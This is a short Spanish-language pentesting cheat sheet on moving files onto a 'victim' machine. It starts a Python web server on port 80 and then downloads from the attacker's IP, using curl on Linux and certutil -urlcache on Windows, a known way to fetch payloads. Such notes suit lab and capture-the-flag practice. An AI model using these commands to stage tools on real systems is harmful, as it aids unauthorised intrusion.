
### Máquina Linux
 
- Levantar servidor wed por el puerto 80 en la carpeta donde se encuentra el archivo a compartir: `python3 -m http.server 80`
- Descargar archivo en máquina víctima , dentro de su terminal ponemos: 
	```
	curl http://<IP>/<nombre del archivo>
	```

---
### Máquina Window

- Levantar servidor wed por el puerto 80 en la carpeta donde se encuentra el archivo a compartir: `python3 -m http.server 80`
- Descargar archivo en máquina víctima , dentro de su terminal ponemos: 
	```
	certutil -split -urlcache -f http://<IP>/<nombre del archivo> <nombre del          archivo>
	```
